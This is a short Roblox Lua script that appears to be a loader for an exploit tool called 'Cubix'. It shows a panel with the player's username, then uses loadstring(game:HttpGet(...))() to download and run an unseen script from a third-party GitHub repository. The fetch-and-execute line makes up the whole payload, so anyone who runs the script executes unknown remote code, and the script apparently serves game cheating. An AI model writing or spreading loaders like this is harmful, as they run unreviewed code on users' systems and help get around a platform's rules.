
function functionExists()
    return true
end


if functionExists() then

    local player = game.Players.LocalPlayer
    local username = player.Name
    local screenGui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local textLabel = Instance.new("TextLabel")

    screenGui.Parent = player:WaitForChild("PlayerGui")
    screenGui.Name = "CustomUI"

    frame.Parent = screenGui
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)

    textLabel.Parent = frame
    textLabel.Text = "Executing.. Cubix Agentusernify\n\nUsername: " .. username
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.BackgroundTransparency = 1
    textLabel.TextScaled = true


    wait(2)


    loadstring(game:HttpGet("https://raw.githubusercontent.com/0tff/dumpfolder/main/script%3Dtrue.lua", true))()


    textLabel.Text = "Executed"
    wait(2)


    screenGui:Destroy()
end
